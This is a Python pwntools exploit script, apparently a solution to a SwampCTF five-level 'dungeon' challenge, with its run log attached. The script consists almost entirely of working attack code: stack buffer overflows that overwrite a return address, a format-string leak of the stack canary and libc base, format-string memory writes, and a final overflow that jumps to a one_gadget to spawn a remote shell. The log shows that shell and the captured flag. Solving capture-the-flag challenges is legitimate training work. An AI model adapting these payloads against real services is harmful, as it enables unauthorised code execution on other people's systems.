
from pwn import *
import time
import sys

def Dungeon(DEBUG):
	if DEBUG=="1":
		r = process("./level1")
		# r = process("./level5", env={"LD_PRELOAD":"./libc.so.6"})
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = 'chal1.swampctf.com'
		PORT = 1337
		r = remote(HOST,PORT)
	
	def level1():
		r.recvuntil("Access token please: ")
		r.sendline(str(252534))
	
	def level2():
		r.recvuntil("What is your party name? ")
		payload = "A"*(0x88-0xC)
		payload += p32(0xCC07C9)
		r.sendline(payload)
		
	def level3():
		goal = 0x0804862D
		r.recvuntil("Just a simple question...what is your favorite spell?")
		payload = "A"*0x84
		payload += "B"*4
		payload += p32(goal)
		r.sendline(payload)
	
	def level4():
		goal = 0x0804A47C
		action = 73
		r.recvuntil("Choose an action: ")
		r.sendline(str(action))
		r.recvuntil("Hey traveler, what is your name? ")
		payload = p32(goal)*(120/4)
		r.sendline(payload)
	
	def level5():
		offset = 79
		offset2 = 105
		offset_one_gadget = 0xf1147 # execve("/bin/sh", rsp+0x70, environ)
		r.recvuntil("Choice [0 exit][1 small][2 large][3 format]: ")
		r.sendline("3")
		r.recvuntil("Path 3 - The possibilities are endless!\n")
		r.sendline("%71$p-%77$p-%79$p")
		res = r.recvline().replace("\n","").split("-")
		canary = int(res[0],16)
		__libc_start_main_ret = int(res[1],16)
		stack = int(res[2],16)
		base_libc = __libc_start_main_ret - 0x20830
		one_gadget = base_libc + offset_one_gadget
		log.info('canary: %#x' % canary)
		log.info('stack: %#x' % stack)
		log.info('stack rsp+0x70: %#x' % (stack-0x88))
		log.info('__libc_start_main_ret: %#x' % __libc_start_main_ret)
		log.info('one_gadget: %#x' % one_gadget)
		log.info('base_libc: %#x' % base_libc)
		
		r.sendline("3")
		payload = "%"+str((stack-0x88)&0xffff)+"u"+"%"+str(offset)+"$hn"
		r.sendline(payload)
		
		r.sendline("3")
		payload = "%"+str(offset2)+"$n"
		r.sendline(payload)
		
		r.sendline("3")
		payload = "%"+str((stack-0x88+4)&0xffff)+"u"+"%"+str(offset)+"$hn"
		r.sendline(payload)
		
		r.sendline("3")
		payload = "%"+str(offset2)+"$n"
		r.sendline(payload)
		
		
		r.sendline("1")
		r.recvuntil("Path 1 - Give yourself an extra challenge :)\n")
		payload = "A"*(0x20-0x8)
		payload += p64(canary)
		payload += "B"*8
		payload += p64(one_gadget)
		payload += "\x00"*(0x40-len(payload))
		r.send(payload)
		
		
	level1()
	level2()
	level3()
	level4()
	level5()
	r.interactive()

Dungeon(sys.argv[1])
"""
$ python dungeon.py 2
[+] Opening connection to chal1.swampctf.com on port 1337: Done
['0xc89f1d1180b25600', '0x7f4d6f04a830', '0x7ffdb9001228']
[*] canary: 0xc89f1d1180b25600
[*] stack: 0x7ffdb9001228
[*] stack rsp+0x70: 0x7ffdb90011a0
[*] __libc_start_main_ret: 0x7f4d6f04a830
[*] one_gadget: 0x7f4d6f11b147
[*] base_libc: 0x7f4d6f02a000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag
level1
level2
level3
level4
level5
$ cat f*
flag{I_SurV1v3d_th3_f1n4l_b0ss}
"""